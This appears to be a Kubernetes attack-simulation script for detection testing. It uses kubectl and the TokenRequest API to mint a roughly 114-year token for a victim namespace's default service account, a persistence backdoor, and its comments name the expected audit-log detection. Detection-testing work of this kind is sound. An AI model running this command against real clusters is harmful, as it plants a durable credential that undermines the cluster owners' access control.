#!/bin/bash
# ============================================================================
# Attack Simulation: Long-Lived Service Account Token Minted
# MITRE ATT&CK: T1098 - Account Manipulation
# Stratus technique: k8s.persistence.create-token
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh
# Fires detection: detections/kql/create-token.kql   (table: AKSAuditAdmin)
# ============================================================================
#
# TACTIC: Persistence (TA0003) / Account Manipulation (T1098). The TokenRequest API can
# mint a JWT for a ServiceAccount with an arbitrary lifetime. Requesting an absurdly
# long duration gives the attacker a stable backdoor credential that outlives normal
# short-lived, auto-rotated pod tokens — persistence that survives pod restarts.
#
# THIS IS AN INTENTIONAL ATTACK SIMULATION for detection testing.
#
# WHAT A DEFENDER SHOULD SEE: an AKSAuditAdmin `create` on the serviceaccounts/token
# subresource, especially with an unusually long requested duration.

# Abort on first error (the API call below has its own fallback message though).
set -e
# Target the "default" ServiceAccount in the "victim" namespace — a common, low-friction
# identity to mint a token for.
SA="default"
NS="victim"

echo "[*] Minting a long-lived token for serviceaccount $NS/$SA via TokenRequest API..."
# serviceaccounts/token subresource — a durable credential for persistence.
# `--duration=999999h` requests a ~114-year token (the API may cap it, but the intent
# and the requested duration are recorded). `|| echo ...` prints a helpful note if RBAC
# denies the request — expected in a well-locked-down cluster.
kubectl create token "$SA" -n "$NS" --duration=999999h || \
  echo "[!] If this errors, your identity lacks create serviceaccounts/token — expected in a locked-down cluster."

echo ""
# Operator-facing hints. No cleanup: TokenRequest tokens are stateless (self-contained
# JWTs), not stored as API objects, so there is nothing to delete — they just expire.
echo "[*] Expected detection: T1098 - Long-Lived Service Account Token Minted"
echo "[*] Expected log table: AKSAuditAdmin  (Verb=create, resource=serviceaccounts/token)"
echo "[*] No cleanup needed — the token is not stored server-side; it simply expires."
